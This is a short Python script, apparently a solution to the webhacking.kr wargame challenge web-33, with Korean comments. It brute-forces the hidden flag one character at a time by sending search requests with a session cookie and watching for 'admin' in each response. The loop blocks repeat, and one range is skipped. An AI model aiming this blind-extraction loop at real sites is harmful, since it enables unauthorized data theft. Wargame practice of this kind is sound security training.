import requests
cookies={'PHPSESSID':'??????????'}

flag="flag{"
data={'search':""} #딕셔너리 방식
 
for i in range(0,5):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)


for i in range(5,10):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)


for i in range(10,15):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)


for i in range(15,20):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)

for i in range(25,30):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)



for i in range(30,35):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)

for i in range(35,40):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)

for i in range(40,45):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)


for i in range(45,50):
    for j in range (48,127):
        

        data['search']=flag+chr(j)
        res=requests.post('https://webhacking.kr/challenge/web-33/',
        cookies=cookies,data=data) 

        if((res.text).find("admin")>0): #문자하나하나를 search에 넣어
            #admin이 검색되면 해당 문자를 플래그에 포함
            flag+=chr(j)
            print(flag)
            break

print("???:"+flag)


